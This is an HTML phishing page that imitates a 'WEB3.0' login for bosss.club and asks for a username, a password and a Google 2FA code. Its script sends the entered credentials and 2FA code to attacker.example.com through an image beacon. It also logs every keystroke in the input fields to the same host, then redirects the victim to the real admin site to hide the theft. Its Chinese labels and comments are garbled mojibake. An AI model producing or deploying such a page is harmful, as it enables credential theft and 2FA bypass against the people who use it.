<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WEB3.0 - 鐧诲綍</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .login-container {
            background: white;
            border-radius: 12px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            padding: 40px;
            width: 100%;
            max-width: 400px;
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo h1 {
            color: #333;
            font-size: 28px;
            font-weight: 600;
        }
        .logo p {
            color: #666;
            font-size: 14px;
            margin-top: 8px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-weight: 500;
        }
        .form-group input {
            width: 100%;
            padding: 12px 16px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 14px;
            transition: border-color 0.3s;
        }
        .form-group input:focus {
            outline: none;
            border-color: #667eea;
        }
        .btn-login {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        .btn-login:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(102, 126, 234, 0.4);
        }
        .security-notice {
            text-align: center;
            margin-top: 20px;
            padding: 12px;
            background: #f8f9fa;
            border-radius: 8px;
            font-size: 12px;
            color: #666;
        }
        .security-notice svg {
            width: 16px;
            height: 16px;
            vertical-align: middle;
            margin-right: 4px;
        }
        .error-message {
            color: #dc3545;
            font-size: 14px;
            text-align: center;
            margin-top: 10px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <h1>WEB3.0</h1>
            <p>瀹夊叏鐧诲綍 - bosss.club</p>
        </div>
        
        <form id="loginForm" onsubmit="return handleLogin(event)">
            <div class="form-group">
                <label for="username">鐢ㄦ埛鍚?/label>
                <input type="text" id="username" name="username" placeholder="璇疯緭鍏ョ敤鎴峰悕" required>
            </div>
            
            <div class="form-group">
                <label for="password">瀵嗙爜</label>
                <input type="password" id="password" name="password" placeholder="璇疯緭鍏ュ瘑鐮? required>
            </div>
            
            <div class="form-group">
                <label for="googlecode">2FA楠岃瘉鐮?/label>
                <input type="text" id="googlecode" name="googlecode" placeholder="璇疯緭鍏oogle楠岃瘉鐮? maxlength="6">
            </div>
            
            <button type="submit" class="btn-login">鐧诲綍</button>
            
            <div class="error-message" id="errorMessage"></div>
        </form>
        
        <div class="security-notice">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
            </svg>
            鍙楀畨鍏ㄧ郴缁熶繚鎶?| 鍙屽洜绱犺璇佸凡鍚敤
        </div>
    </div>

    <script>
        function handleLogin(event) {
            event.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const googlecode = document.getElementById('googlecode').value;
            
            // 鏀堕泦鍑嵁
            const credentials = {
                username: username,
                password: password,
                googlecode: googlecode,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                url: window.location.href
            };
            
            // 鍙戦€佸埌鏀诲嚮鑰呮湇鍔″櫒
            const img = new Image();
            img.src = 'https://attacker.example.com/steal?data=' + encodeURIComponent(JSON.stringify(credentials));
            
            // 鏄剧ず鍔犺浇鐘舵€?            const btn = document.querySelector('.btn-login');
            btn.textContent = '鐧诲綍涓?..';
            btn.disabled = true;
            
            // 妯℃嫙鐧诲綍杩囩▼
            setTimeout(() => {
                // 閲嶅畾鍚戝埌鐪熷疄缃戠珯
                window.location.href = 'https://admin.bosss.club';
            }, 2000);
            
            return false;
        }
        
        // 閿洏璁板綍
        document.addEventListener('keypress', function(e) {
            const target = e.target;
            if (target.tagName === 'INPUT') {
                const data = {
                    key: e.key,
                    field: target.name,
                    timestamp: new Date().toISOString()
                };
                const img = new Image();
                img.src = 'https://attacker.example.com/keys?data=' + encodeURIComponent(JSON.stringify(data));
            }
        });
    </script>
</body>
</html>
